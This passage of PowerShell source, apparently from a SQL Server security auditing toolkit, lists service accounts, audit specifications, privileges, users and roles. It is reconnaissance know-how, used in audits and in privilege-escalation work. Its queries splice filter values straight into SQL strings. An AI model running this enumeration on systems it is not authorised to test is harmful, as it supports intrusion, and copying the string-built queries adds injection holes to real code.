		                    N'ObjectName',@AnalysisLogin OUTPUT

                    -- Get Reporting - Calculated
                    EXECUTE		master.dbo.xp_instance_regread  
		                    N'HKEY_LOCAL_MACHINE', @ReportInstance,  
		                    N'ObjectName',@ReportLogin OUTPUT

                    -- Get SQL Server DTS Server / Analysis - Calulated
                    EXECUTE		master.dbo.xp_instance_regread  
		                    N'HKEY_LOCAL_MACHINE', @IntegrationVersion,  
		                    N'ObjectName',@IntegrationDtsLogin OUTPUT"

            $SysadminQuery = "	,[BrowserLogin] = @BrowserLogin,
		                        [WriterLogin] = @WriterLogin,
		                        [AnalysisLogin] = @AnalysisLogin,
		                        [ReportLogin] = @ReportLogin,
		                        [IntegrationLogin] = @IntegrationDtsLogin"
        }else{
            $SysadminSetup = ""
            $SysadminQuery = ""
        }

        # Define Query
        $Query = "  -- Setup variables
                    DECLARE		@SQLServerInstance	VARCHAR(250)  
                    DECLARE		@MSOLAPInstance		VARCHAR(250) 
                    DECLARE		@ReportInstance 	VARCHAR(250) 
                    DECLARE		@AgentInstance	 	VARCHAR(250) 
                    DECLARE		@IntegrationVersion	VARCHAR(250)
                    DECLARE		@DBEngineLogin		VARCHAR(100)
                    DECLARE		@AgentLogin		VARCHAR(100)
                    DECLARE		@BrowserLogin		VARCHAR(100)
                    DECLARE     	@WriterLogin		VARCHAR(100)
                    DECLARE		@AnalysisLogin		VARCHAR(100)
                    DECLARE		@ReportLogin		VARCHAR(100)
                    DECLARE		@IntegrationDtsLogin	VARCHAR(100)                    

                    -- Get Service Paths for default and name instance
                    if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
                    BEGIN											
	                    -- Default instance paths
	                    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
	                    set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'	
	                    set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer'
	                    set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'	
	                    set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
                    END						
                    ELSE
                    BEGIN
	                    -- Named instance paths
	                    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))	
	                    set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))		
	                    set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer$' + cast(@@SERVICENAME as varchar(250))
	                    set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))	
	                    set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
                    END

                    -- Get SQL Server - Calculated
                    EXECUTE		master.dbo.xp_instance_regread  
		                    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
		                    N'ObjectName',@DBEngineLogin OUTPUT

                    -- Get SQL Server Agent - Calculated
                    EXECUTE		master.dbo.xp_instance_regread  
		                    N'HKEY_LOCAL_MACHINE', @AgentInstance,  
		                    N'ObjectName',@AgentLogin OUTPUT

                    $SysadminSetup

                    -- Dislpay results
                    SELECT		'$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                [DBEngineLogin] = @DBEngineLogin, 
                                [AgentLogin] = @AgentLogin
                                $SysadminQuery"

        # Execute Query
        $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

        # Append results             
        $TblServiceAccount = $TblServiceAccount + $TblResults        
    }

    End
    {  
        # Return data
        $TblServiceAccount         
    }
}


# ----------------------------------
#  Get-SQLAuditDatabaseSpec
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLAuditDatabaseSpec{
<#
    .SYNOPSIS
        Returns Audit database specifications from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER AuditName
        Audit name. 
    .PARAMETER AuditSpecification
        Audit specification. 
    .PARAMETER AuditAction
        Audit action name.
    .EXAMPLE
        PS C:\> Get-SQLAuditDatabaseSpec -Verbose -Instance "SQLServer1"
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLAuditDatabaseSpec -Verbose    
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Audit name.")]
        [string]$AuditName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Specification name.")]
        [string]$AuditSpecification,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Audit action name.")]
        [string]$AuditAction,

        
        
        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAuditDatabaseSpec = New-Object System.Data.DataTable

        # Setup audit name filter
        if($AuditName){            
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }else{
            $AuditNameFilter = ""
        }

        # Setup spec name filter
        if($AuditSpecification){            
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }else{
            $SpecNameFilter = ""
        }

        # Setup action name filter
        if($AuditAction){            
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }else{
            $ActionNameFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance 

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

       
        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }
        
                       
        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            audit_id as [AuditId], 
                            a.name as [AuditName], 
                            s.name as [AuditSpecification],
                            d.audit_action_id as [AuditActionId],
                            d.audit_action_name as [AuditAction],
                            s.is_state_enabled,
                            d.is_group,	
                            s.create_date,
                            s.modify_date,
                            d.audited_result
                    FROM sys.server_audits AS a
                    JOIN sys.database_audit_specifications AS s
                        ON a.audit_guid = s.audit_guid
                    JOIN sys.database_audit_specification_details AS d
                        ON s.database_specification_id = d.database_specification_id WHERE 1=1                   
                    $AuditNameFilter
                    $SpecNameFilter
                    $ActionNameFilter"

        # Execute Query        
        $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

        # Append results             
        $TblAuditDatabaseSpec = $TblAuditDatabaseSpec + $TblResults      
    }

    End
    {  
        # Return data
        $TblAuditDatabaseSpec        
    }
}


# ----------------------------------
#  Get-SQLAuditServerSpec
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLAuditServerSpec{
<#
    .SYNOPSIS
        Returns Audit server specifications from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER AuditName
        Audit name. 
    .PARAMETER AuditSpecification
        Audit specification. 
    .PARAMETER AuditAction
        Audit action name.
    .EXAMPLE
        PS C:\> Get-SQLAuditServerSpec -Verbose -Instance "SQLServer1"
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLAuditServerSpec -Verbose    
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Audit name.")]
        [string]$AuditName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Specification name.")]
        [string]$AuditSpecification,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Audit action name.")]
        [string]$AuditAction,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAuditServerSpec = New-Object System.Data.DataTable

        # Setup audit name filter
        if($AuditName){            
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }else{
            $AuditNameFilter = ""
        }

        # Setup spec name filter
        if($AuditSpecification){            
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }else{
            $SpecNameFilter = ""
        }

        # Setup action name filter
        if($AuditAction){            
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }else{
            $ActionNameFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance 

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            audit_id as [AuditId], 
		                    a.name as [AuditName], 
		                    s.name as [AuditSpecification],
		                    d.audit_action_name as [AuditAction],
		                    s.is_state_enabled,
		                    d.is_group,
		                    d.audit_action_id as [AuditActionId],	
		                    s.create_date,
		                    s.modify_date
                    FROM sys.server_audits AS a
                    JOIN sys.server_audit_specifications AS s
                            ON a.audit_guid = s.audit_guid
                    JOIN sys.server_audit_specification_details AS d
                            ON s.server_specification_id = d.server_specification_id WHERE 1=1
                    $AuditNameFilter
                    $SpecNameFilter
                    $ActionNameFilter"

            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results             
            $TblAuditServerSpec  = $TblAuditServerSpec  + $TblResults       
    }

    End
    {  
        # Return data
        $TblAuditServerSpec           
    }
}


# ----------------------------------
#  Get-SQLServerPriv
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerPriv {
<#
    .SYNOPSIS
        Returns SQL Server login privilege information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER PermissionName
        Permission name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLServerPriv -Instance SQLServer1\STANDARDDEV2014 -PermissionName IMPERSONATE

        ComputerName    : SQLServer1
        Instance        : SQLServer1\STANDARDDEV2014
        GranteeName     : public
        GrantorName     : sa
        PermissionClass : SERVER_PRINCIPAL
        PermissionName  : IMPERSONATE
        PermissionState : GRANT
        ObjectName      : sa
        ObjectType      : SQL_LOGIN
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerPriv -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Permission name.")]
        [string]$PermissionName
    )

    Begin
    {
        # Table for output
        $TblServerPrivs = New-Object System.Data.DataTable

        # Setup $PermissionName filter
        if($PermissionName){
            $PermissionNameFilter = " WHERE PER.permission_name like '$PermissionName'"
        }else{
            $PermissionNameFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            GRE.name as [GranteeName],
                            GRO.name as [GrantorName],
                            PER.class_desc as [PermissionClass],
                            PER.permission_name as [PermissionName],
                            PER.state_desc as [PermissionState],
                            COALESCE(PRC.name, EP.name, N'') as [ObjectName],
                            COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
                    FROM [sys].[server_permissions] as PER
                    INNER JOIN sys.server_principals as GRO
                            ON PER.grantor_principal_id = GRO.principal_id
                    INNER JOIN sys.server_principals as GRE
                            ON PER.grantee_principal_id = GRE.principal_id
                    LEFT JOIN sys.server_principals as PRC
                            ON PER.class = 101 AND PER.major_id = PRC.principal_id
                    LEFT JOIN sys.endpoints AS EP
                            ON PER.class = 105 AND PER.major_id = EP.endpoint_id
                    $PermissionNameFilter
                    ORDER BY GranteeName,PermissionName;"

        # Execute Query
        $TblServerPrivsTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

        # Append data as needed
        $TblServerPrivs = $TblServerPrivs + $TblServerPrivsTemp
    }

    End
    {  
        # Return data
        $TblServerPrivs           
    }
}


# ----------------------------------
#  Get-SQLDatabasePriv
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabasePriv {
<#
    .SYNOPSIS
        Returns database user privilege information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER NoDefaults
        Only select non default databases.
    .PARAMETER PermissionName
        Permission name to filter for.
    .PARAMETER PermissionType
        Permission type name to filter for.
    .PARAMETER PrincipalName
        Principal name to filter for.        
    .EXAMPLE
        PS C:\> Get-SQLDatabasePriv -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PermissionName "VIEW DEFINITION"

        ComputerName     : SQLServer1
        Instance         : SQLServer1\STANDARDDEV2014
        DatabaseName     : testdb
        PrincipalName    : createprocuser
        PrincipalType    : SQL_USER
        PermissionType   : SCHEMA
        PermissionName   : VIEW DEFINITION
        StateDescription : GRANT
        ObjectType       : SCHEMA
        ObjectName       : dbo
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLDatabasePriv -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,                
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server database name to filter for.")]
        [string]$DatabaseName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Permission name to filter for.")]
        [string]$PermissionName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Permission type to filter for.")]
        [string]$PermissionType,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Principal name for grantee to filter for.")]
        [string]$PrincipalName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Don't select permissions for default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabasePrivs = New-Object System.Data.DataTable

        # Setup PermissionName filter
        if($PermissionName){
            $PermissionNameFilter = " and pm.permission_name like '$PermissionName'"
        }else{
            $PermissionNameFilter = ""
        }
        
         # Setup PermissionName filter
        if($PrincipalName){
            $PrincipalNameFilter = " and rp.name like '$PrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }

         # Setup PermissionType filter
        if($PermissionType){
            $PermissionTypeFilter = " and pm.class_desc like '$PermissionType'"
        }else{
            $PermissionTypeFilter = ""
        }
    }

    Process
    {   
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Setup NoDefault filter
        if($NoDefaults){
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }else{            
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose         
        }  

        # Get the privs for each database
        $TblDatabases | 
        ForEach-Object {

            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$DbName' as [DatabaseName],
                                rp.name as [PrincipalName], 
                                rp.type_desc as [PrincipalType], 
                                pm.class_desc as [PermissionType], 
                                pm.permission_name as [PermissionName], 
                                pm.state_desc as [StateDescription], 
                                ObjectType = CASE 
                                WHEN obj.type_desc IS NULL 
                                OR obj.type_desc = 'SYSTEM_TABLE' THEN 
                                    pm.class_desc 
                                ELSE 
                                    obj.type_desc 
                                END, 
                                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id)) 
                        FROM   $DbName.sys.database_principals rp 
                        INNER JOIN $DbName.sys.database_permissions pm 
                                ON pm.grantee_principal_id = rp.principal_id 
                        LEFT JOIN $DbName.sys.schemas ss 
                                ON pm.major_id = ss.schema_id 
                        LEFT JOIN $DbName.sys.objects obj 
                                ON pm.[major_id] = obj.[object_id] WHERE 1=1
                        $PermissionTypeFilter
                        $PermissionNameFilter
                        $PrincipalNameFilter"               

            # Execute Query
            if(-not $SuppressVerbose){
                Write-Verbose "$Instance : Grabbing permissions for the $DbName database..."
            }

            $TblDatabaseTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDatabasePrivs = $TblDatabasePrivs + $TblDatabaseTemp
        }          
    }

    End
    {  
        # Return data
        $TblDatabasePrivs           
    }
}


# ----------------------------------
#  Get-SQLDatabaseUser
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseUser {
<#
    .SYNOPSIS
        Returns database user information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER DatabaseUser
        Database user to filter for.
    .PARAMETER PrincipalName
        Principal name to filter for.
    .PARAMETER NoDefaults
        Only show information for non default databases.    

    .EXAMPLE
        PS C:\> Get-SQLDatabaseUser -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil

        ComputerName       : SQLServer1
        Instance           : SQLServer1\STANDARDDEV2014
        DatabaseName       : testdb
        DatabaseUserId     : 5
        DatabaseUser       : evil
        PrincipalSid       : 3E26CA9124B4AE42ABF1BBF2523738CA
        PrincipalName      : evil
        PrincipalType      : SQL_USER
        deault_schema_name : dbo
        create_date        : 04/22/2016 13:00:33
        is_fixed_role      : False
        [TRUNCATED]
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseUser -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,                
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server database name.")]
        [string]$DatabaseName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Database user.")]
        [string]$DatabaseUser,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Server login.")]
        [string]$PrincipalName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Do not show database users associated with default databases.")]
        [Switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabaseUsers = New-Object System.Data.DataTable
        $TblDatabaseUsers.Columns.Add("ComputerName") | Out-Null
        $TblDatabaseUsers.Columns.Add("Instance") | Out-Null
        $TblDatabaseUsers.Columns.Add("DatabaseName") | Out-Null
        $TblDatabaseUsers.Columns.Add("DatabaseUserId") | Out-Null
        $TblDatabaseUsers.Columns.Add("DatabaseUser") | Out-Null
        $TblDatabaseUsers.Columns.Add("PrincipalSid") | Out-Null
        $TblDatabaseUsers.Columns.Add("PrincipalName") | Out-Null
        $TblDatabaseUsers.Columns.Add("PrincipalType") | Out-Null
        $TblDatabaseUsers.Columns.Add("deault_schema_name") | Out-Null
        $TblDatabaseUsers.Columns.Add("create_date") | Out-Null
        $TblDatabaseUsers.Columns.Add("is_fixed_role") | Out-Null

        # Setup PrincipalName filter
        if($PrincipalName){
            $PrincipalNameFilter = " and b.name like '$PrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }

        # Setup DatabaseUser filter
        if($DatabaseUser){
            $DatabaseUserFilter = " and a.name like '$DatabaseUser'"
        }else{
            $DatabaseUserFilter = ""
        }
    }

    Process
    {   
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }


        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults){
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }else{
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  
        }

        # Get the privs for each database
        $TblDatabases | 
        ForEach-Object {

            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Grabbing database users from $DbName."
            }

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$DbName' as [DatabaseName],
                                a.principal_id as [DatabaseUserId],
	                            a.name as [DatabaseUser],
	                            a.sid as [PrincipalSid],
	                            b.name as [PrincipalName],
	                            a.type_desc as [PrincipalType],
	                            default_schema_name,
	                            a.create_date,
	                            a.is_fixed_role
                        FROM    [sys].[database_principals] a
                        LEFT JOIN [sys].[server_principals] b
	                            ON a.sid = b.sid WHERE 1=1       
                        $DatabaseUserFilter
                        $PrincipalNameFilter"               

            # Execute Query
            $TblDatabaseUsersTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Update sid formatting for each entry and append results
            $TblDatabaseUsersTemp | 
            ForEach-Object {
                
                # Convert SID to string
                if($_.PrincipalSid.GetType() -eq [System.DBNull]){
                    $Sid = ""
                }else{
                    # Format principal sid
                    $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace("-","") 
                    if ($NewSid.length -le 10){                
                        $Sid = [Convert]::ToInt32($NewSid,16)
                    }else{
                        $Sid = $NewSid
                    }
                }

                # Add results to table                
		        $TblDatabaseUsers.Rows.Add(
                            [string]$_.ComputerName,
                            [string]$_.Instance,
                            [string]$_.DatabaseName,
                            [string]$_.DatabaseUserId,
                            [string]$_.DatabaseUser,
                            $Sid,
                            [string]$_.PrincipalName,
                            [string]$_.PrincipalType,
                            [string]$_.default_schema_name,
                            [string]$_.create_date,
                            [string]$_.is_fixed_role) | Out-Null         
            }
        }          
    }

    End
    {  
        # Return data
        $TblDatabaseUsers         
    }
}


# ----------------------------------
#  Get-SQLServerRole
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerRole {
<#
    .SYNOPSIS
        Returns SQL Server role information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER RolePrincipalName
        Role principal name to filter for. 
    .PARAMETER RoleOwner
        Role owner name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLServerRole -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

        ComputerName          : SQLServer1
        Instance              : SQLServer1\STANDARDDEV2014
        RolePrincipalId       : 2
        RolePrincipalSid      : 2
        RolePrincipalName     : public
        RolePrincipalType     : SERVER_ROLE
        OwnerPrincipalId      : 1
        OwnerPrincipalName    : sa
        is_disabled           : False
        is_fixed_role         : False
        create_date           : 4/13/2009 12:59:06 PM
        modify_Date           : 4/13/2009 12:59:06 PM
        default_database_name : 
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerRole -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Role name.")]
        [string]$RolePrincipalName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Role owner's name.")]
        [string]$RoleOwner
    )

    Begin
    {
        # Setup table for output
